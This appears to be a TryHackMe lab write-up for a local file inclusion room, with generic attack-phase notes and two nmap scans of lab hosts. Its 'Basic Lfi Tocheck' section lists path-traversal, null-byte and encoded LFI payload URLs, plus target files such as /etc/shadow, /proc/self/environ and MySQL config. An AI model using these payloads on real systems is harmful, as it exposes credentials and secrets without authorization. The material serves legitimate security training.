---
layout: writeup
title: "/lfi"
permalink: "/writeups/tryhackme/lfi/"
platform: "TryHackMe"
writeup_type: "room"
room_name: "LFI"
---

<section class="page-hero panel">
  <p class="eyebrow">root@rumais:~# inspect lfi</p>
  <h1>LFI</h1>
  <p>Web-facing lab centered on application testing, content discovery, misconfiguration abuse, and foothold development. This page consolidates local notes, recovered artifacts, and cleaned-up workflow guidance with sensitive answers and flags redacted.</p>
</section>

<section class="panel">
  <h2>Room Profile</h2>
  <p>Built from supporting notes and artifacts. This room is grouped under <strong>Web and App Security</strong>.</p>
  <div class="tag-list">
    <span class="tag">Web and App Security</span>
    <span class="tag">3 docx note</span>
    <span class="tag">2 command artifact</span>
  </div>
</section>

<section class="panel">
  <h2>Workflow Focus</h2>
  <p>Web-facing lab centered on application testing, content discovery, misconfiguration abuse, and foothold development. Use the recovered artifacts below as the evidence base for enumeration, access development, and post-exploitation review.</p>
</section>

## Operator Notes

## Recon

- The web application is the main attack surface, so content discovery, login behavior, and hidden paths matter immediately.
- LFI rewards careful note-taking and stepwise validation rather than trial-and-error execution.

## Initial Access

- The intended foothold comes from chaining application flaws, exposed content, or weak credentials into code execution or authenticated access.
- The room path becomes clear once the recovered artifacts and service behavior are linked together.

## Privilege Escalation

- Once the app is compromised, the next step is to stabilize host access and enumerate for the final path to proof material.
- After the foothold, local context matters more than noisy exploitation.

## Defensive Takeaway

- The defensive lesson is that web compromise rarely stays in the web tier when secrets, upload paths, or admin functions are exposed.

## Supporting Notes

### Basic Lfi Tocheck

http://example.com/index.php?page=etc/passwd
http://example.com/index.php?page=etc/passwd%00
http://example.com/index.php?page=../../etc/passwd
http://example.com/index.php?page=%252e%252e%252f
http://example.com/index.php?page=....//....//etc/passwd
Interesting files to check out :
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline

## Evidence Pack

### nmap-initial

```text
# Nmap 7.91 scan initiated Sat Jun 19 11:17:17 2021 as: nmap -sV -sC -oN ./nmap-initial 10.10.181.167
Nmap scan report for 10.10.181.167
Host is up (1.0s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
|_  256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-server-header: Werkzeug/0.16.0 Python/3.6.9
|_http-title: My blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 19 11:18:07 2021 -- 1 IP address (1 host up) scanned in 50.39 seconds
```

### nmap-initial

```text
# Nmap 7.91 scan initiated Sat Jun 19 10:35:51 2021 as: nmap -sV -sC -oN ./nmap-initial 10.10.123.22
Nmap scan report for 10.10.123.22
Host is up (0.66s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:b9:f0:d3:e4:b3:17:9c:7f:b6:7d:28:72:8a:e4:77 (RSA)
|   256 07:f2:d9:85:77:74:52:2a:73:76:70:35:73:70:c3:9e (ECDSA)
|_  256 23:ba:e8:b6:8b:a2:ac:58:3b:f4:04:dc:6e:36:b7:f2 (ED25519)
80/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.6.9)
|_http-server-header: Werkzeug/0.16.1 Python/3.6.9
|_http-title: Shop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 19 10:36:59 2021 -- 1 IP address (1 host up) scanned in 68.35 seconds
```
